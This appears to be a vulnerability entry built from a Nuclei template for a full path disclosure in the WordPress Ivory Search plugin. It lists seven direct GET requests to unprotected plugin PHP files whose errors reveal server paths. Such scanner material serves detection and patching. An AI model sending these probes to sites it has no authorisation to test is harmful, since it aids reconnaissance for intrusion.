# Vulnerability: WordPress Ivory Search - Full Path Disclosure
**Classification:** WP
**Source:** Nuclei Template (`wp-add-search-to-menu-fpd.yaml`)

## Description
WordPress Plugin Ivory Search plugin files are publicly accessible without ABSPATH protection, exposing sensitive server path information through PHP error messages when accessed directly.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/add-search-to-menu/includes/class-is-admin-public.php
GET {{BaseURL}}/wp-content/plugins/add-search-to-menu/includes/class-is-widget.php
GET {{BaseURL}}/wp-content/plugins/add-search-to-menu/includes/class-is-index-options.php
GET {{BaseURL}}/wp-content/plugins/add-search-to-menu/includes/class-is-index-manager.php
GET {{BaseURL}}/wp-content/plugins/add-search-to-menu/includes/class-is-customizer.php
GET {{BaseURL}}/wp-content/plugins/add-search-to-menu/includes/compatibility/class-is-tablepress-compat.php
GET {{BaseURL}}/wp-content/plugins/add-search-to-menu/admin/class-is-list-table.php
```

